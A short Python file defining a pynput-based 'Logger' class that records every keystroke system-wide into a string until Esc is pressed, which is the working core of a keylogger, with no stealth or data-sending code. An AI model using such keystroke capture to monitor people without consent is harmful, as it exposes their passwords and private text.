from pynput import keyboard
from threading import Thread


class Logger:
    def __init__(self, log = ''):
        self.log = log

    def init(self):
        with keyboard.Listener(
                on_press=self.on_press,
                on_release=self.on_release) as listener:

            t = Thread(target=listener.join, daemon=True)

            t.start()
            t.join()

    def on_press(self, key):
        try:
            self.log += key.char
        except AttributeError:
            if key == keyboard.Key.space:
                self.log += ' '
            else:
                self.log += f' <{str(key)[4:]}> '

    def on_release(self, key):
        if key == keyboard.Key.esc:
            return False

    def get_log(self):
        return self.log